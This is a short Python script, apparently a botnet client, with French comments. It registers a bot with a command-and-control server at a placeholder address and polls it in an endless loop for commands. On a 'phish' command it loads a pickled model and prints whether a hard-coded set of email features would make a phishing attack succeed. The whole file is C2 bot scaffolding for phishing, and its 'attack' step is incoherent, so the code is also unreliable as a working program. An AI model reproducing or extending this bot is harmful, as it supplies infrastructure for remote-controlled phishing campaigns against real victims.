import requests
import time
import json
import pickle
import numpy as np

C2_URL = 'http://<C2_SERVER_IP>:5000'

bot_info = {
    "bot_id": "bot_001",
    "ip": "192.168.1.2",
    "status": "active"
}

def register_bot():
    response = requests.post(f'{C2_URL}/register', json=bot_info)
    print(response.json())

def get_command():
    response = requests.get(f'{C2_URL}/command')
    command = response.json()
    execute_command(command)

def execute_command(command):
    if command.get("action") == "phish":
        run_phishing_attack()

def run_phishing_attack():
    # Charger le modèle
    with open('phishing_model.pkl', 'rb') as f:
        model = pickle.load(f)
    # Exemple de caractéristiques d'un email de phishing
    email_features = np.array([[150, 3, 1]])
    prediction = model.predict(email_features)
    if prediction[0] == 1:
        print("Phishing attack likely to succeed.")
    else:
        print("Phishing attack likely to fail.")

if __name__ == '__main__':
    register_bot()
    while True:
        get_command()
        time.sleep(10)
